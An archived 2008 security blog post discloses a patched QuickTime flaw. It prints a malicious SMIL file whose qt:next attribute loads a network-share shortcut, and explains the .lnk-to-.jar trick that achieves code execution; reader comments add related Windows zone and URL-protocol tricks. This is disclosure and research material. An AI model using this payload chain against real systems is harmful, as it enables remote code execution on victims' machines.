<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Details of the QuickTime Vulnerability</title><meta name="description" content="In this post I intend to give a brief overview of the QuickTime vulnerability which I partially-disclosed over here. I should have made these details public long time ago but better late than never. The vulnerability has been fixed for several months now and I believe it is safe to talk about it in the public."><meta property="name" content="Details of the QuickTime Vulnerability"><meta itemprop="name" content="Details of the QuickTime Vulnerability"><meta property="description" content="In this post I intend to give a brief overview of the QuickTime vulnerability which I partially-disclosed over here. I should have made these details public long time ago but better late than never. The vulnerability has been fixed for several months now and I believe it is safe to talk about it in the public."><meta itemprop="description" content="In this post I intend to give a brief overview of the QuickTime vulnerability which I partially-disclosed over here. I should have made these details public long time ago but better late than never. The vulnerability has been fixed for several months now and I believe it is safe to talk about it in the public."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fdetails-of-the-quicktime-vulnerability%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fdetails-of-the-quicktime-vulnerability%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/details-of-the-quicktime-vulnerability/"><meta property="og:title" content="Details of the QuickTime Vulnerability"><meta property="og:description" content="In this post I intend to give a brief overview of the QuickTime vulnerability which I partially-disclosed over here. I should have made these details public long time ago but better late than never. The vulnerability has been fixed for several months now and I believe it is safe to talk about it in the public."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fdetails-of-the-quicktime-vulnerability%2F?w=1024"><meta name="twitter:title" content="Details of the QuickTime Vulnerability"><meta name="twitter:description" content="In this post I intend to give a brief overview of the QuickTime vulnerability which I partially-disclosed over here. I should have made these details public long time ago but better late than never. The vulnerability has been fixed for several months now and I believe it is safe to talk about it in the public."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fdetails-of-the-quicktime-vulnerability%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Details of the QuickTime Vulnerability</h1><div>Tue, 09 Sep 2008 14:24:38 GMT</div><div id="post-content"><p>In this post I intend to give a brief overview of the QuickTime vulnerability which I partially-disclosed over <a href="/blog/quicktime-0day-for-vista-and-xp/">here</a>. I should have made these details public long time ago but better late than never. The vulnerability has been fixed for several months now and I believe it is safe to talk about it in the public.</p>
<p>Let&#39;s start with an example. The following is the source code of a malicious QuickTime SMIL file:</p>
<pre><code class="language-xml">**SMILtext** <span class="tag">&lt;<span class="name">smil</span>
<span class="attr">xmlns:qt</span>=<span class="string">"http://www.apple.com/quicktime/resourc
es/smilextensions"</span> <span class="attr">qt:autoplay</span>=<span class="string">"true"</span>
<span class="attr">qt:next</span>=<span class="string">"**file://172.16.3.124/evil/evil.lnk**"</span>&gt;</span>
<span class="tag">&lt;<span class="name">body</span>&gt;</span>
<span class="tag">&lt;<span class="name">seq</span> <span class="attr">repeatCount</span>=<span class="string">"indefinite"</span>&gt;</span>
<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"test.jpg"</span> <span class="attr">dur</span>=<span class="string">"1s"</span>/&gt;</span>
<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"test.jpg"</span> <span class="attr">dur</span>=<span class="string">"1s"</span>/&gt;</span>
<span class="tag">&lt;/<span class="name">seq</span>&gt;</span>
<span class="tag">&lt;/<span class="name">body</span>&gt;</span>
<span class="tag">&lt;/<span class="name">smil</span>&gt;</span></code></pre>
<p>First of all, we start with the SMIL header (<code>SMILtext</code>). This is necessary in order to masquerade the file as a different file type, i.e. if we paste the above text into a file with extension <code>.mp3</code>, it will still play in QuickTime. We can use practically any other file extension which defaults to the QuickTime player.</p>
<p>After that we follow with a very standard SMIL document. The most interesting information in order to make the exploit works is contained inside the <code>qt:next</code> attribute of the <code>smil</code> root element. This attribute instructs QuickTime to play another media file after we are done with the current one. The attribute expects a URL which can start with the <code>file://</code> protocol handler. This is understandable since we might want to play local files as well as remote ones, i.e. <code>http://</code>.</p>
<p>The URL is passed to the <code>FileProtocolHandler</code> from <code>url.dll</code>. The function understands that we are asking for a local resource. However, pay attention on the format of the URL we are passing. Let&#39;s take a closer look: <code>file://172.16.3.124/evil/evil.lnk</code></p>
<p>Most of you will recognize that this is a URL which points to a NETBIOS share located on <code>172.16.3.124</code>.</p>
<p>Perhaps you are thinking that this is the problem. Well yes, but we are not there just yet. Initially, when I was playing with this bug, I was trying to launch a URL like this one: <code>file://172.16.3.124/evil/evil.exe</code>. The URL points to an executable. Unfortunately, the attack was failing because usually XP SP1 and up, I believe (excuse my ignorance), will warn you that you are trying to execute an application from an untrusted share. Typically, you will see a warning box but because <code>FileProtocolHandler</code> suppresses that, the function silently fails. I&#39;ve tried with <code>.bat</code>, <code>.cmd</code>, <code>.vbs</code>, <code>.js</code>, <code>.application</code> and other known executable file formats but none of them seemed to work. This is due to the fact that the operating system knows that these files are executables and could harm your system, therefore it prevents their execution.</p>
<p>So I needed to find a file format which is executable but Windows does not know about it just yet. It seems that <code>.jar</code> fits perfectly my requirements. <code>.jar</code> is the file extension of the JAR archive, a ZIP archive with a manifest file which instructs the Java interpreter what class should be executed as the main one. <code>.jar</code> files are executable as long as you have Java on your system.</p>
<p>So we are done! Right? Not quite. If you try to send <code>file://172.16.3.124/evil/evil.jar</code> to <code>FileProtocolHandler</code> you will notice that <code>java.exe</code> fails with an error messages informing you that there is no such class. What happens is that Java does not understand what <code>file://172.16.3.124/evil/evil.jar</code> actually is. This is due to the fact that the URL notation we are using is non-standard, i.e. it is made up by Microsoft&#39;s engineers to seamlessly incorporate NETBIOS shares into the operating system.</p>
<p>So what do we do? It took me some time to figure this out. My approach is very simple. First of all we create a simple <code>.lnk</code> (link/shortcut) file in the same directory where the malicious <code>.jar</code> file is located. Then we use the shortcut to rewrite the URL from <code>file://172.16.3.124/evil/evil.jar</code> to <code>\\172.16.3.124\evil\evil.jar</code>, which is the correct NETBIOS notation. The Java interpreter is very much aware of this syntax and it will happily load the file and attack the victim&#39;s system.</p>
<blockquote>
<p>In summary, I had to go from QuickTime to Windows Internals to URL Manipulation to Java. However, the attack is very simple to implement and understand, yet very effective. I must say that you can definitely win a laptop on the annual POWN2OWN contest by using as simple trick as the one presented here. Security vulnerabilities do not have to be complicated!</p>
</blockquote>
<p><em>I am planning to talk about the impact of this attack in my next post.</em></p>
</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian 'pagvac' Pastor"><span>Adrian 'pagvac' Pastor</span><div class="post-comment-content">This is a neat example of a simple bug that can lead to command execution. Simple yet effective.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="djTeller"><span>djTeller</span><div class="post-comment-content">So Simple but yet so destructive. I guess QT rushed into fixing this bug, so there are probably some more attack vectors with the SMIL format or even the same one with a twist.

Great work PDP thanks for the info.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="denka"><span>denka</span><div class="post-comment-content">Can you be specific to the extent of damage the Java application loaded in this way (from a share) can do? Will it not fail with any attempt to read/write files, or launch other applications?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">in my POC, it launches the system calculator and this is enough to make me worried.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Edu"><span>Edu</span><div class="post-comment-content">First of all, sorry for bumping this up. Read this please as it may clear out stuff.

from what I read from your Quick Time POC, you use the qtnext instruction to open an arbitrary URL. The vulnerability itself is not in Quicktime but in the function of the url.dll file that is called. Internet shortcut files functions in a similar way, although the function executed is from ieframe.dll, not url.dll (at least when IE 7 is installed). 

For what I read, what happens is that the qtnext instruction is executed pretty much like an URL file, so that the file that will be opened will be subject to the famous Internet Explorer security zones scheme. dotted URL addresses are automatically put in the Internet security zone by default, in which the default setting for opening programs and unsafe files (unsafe means the extension is in the Microsoft blacklist, this includes a hell lot of file types, like .url, .chm., .hta, .wsf, etc) is set to prompt, so this is why it was not working (You were probably getting a file execution prompt, which informs u the file name and extension plus the type and Editor, if it has a valid digital signature). If you had used an address such as file&#58;//computername/share/file.exe it would probably work just fine, in case you have IE 6 or if IE 7 has determined your computer is part of a domain and/or if you have manually enabled the intranet settings, because the file is automatically put in the Local Intranet security zone. 

XP SP2/SP3 operating system has got a bug in which for some reason, when you open an internet shortcut that points to a shortcut file located in a network share (at the internet security zone), it will be automatically loaded and executed, as long as the command line for the shortcut (.LNK file) points to a local program, which in turn you can pass parameters. and that´s why it worked for QuickTime.

PS: Windows 2000 SP4 seems to automatically load and run arbitrary files located in network shares (that include addresses placed in both the local intranet and internet zone), so I guess if you pointed the qtnext instruction to an address such as file&#58;//x.x.x.x/share/file.exe, the file.exe would be automatically executed on this system. I say *seems* because this copy of Windows 2000 I have I downloaded from the internet and installed over a virtual machine and it could be messed up.

I remember joking with friends that had Quicktime, by passing the url shell:personal to the qtnext parameter and it would load the contents of mydocuments folder. The fact that you can pass arbitrary URL protocols to the qtnext opens a door for a known type of attack : parameter injection on URL protocols.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>